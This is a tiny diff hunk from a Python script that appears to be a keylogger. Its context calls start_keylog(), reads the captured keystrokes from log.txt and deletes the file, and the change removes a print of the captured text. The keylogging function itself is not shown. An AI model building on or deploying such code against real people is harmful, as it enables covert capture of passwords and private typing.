@@ -20,5 +20,3 @@ start_keylog()
 with open('log.txt','r') as file:
     res = file.read()
 os.remove('log.txt')
-
-print(res)
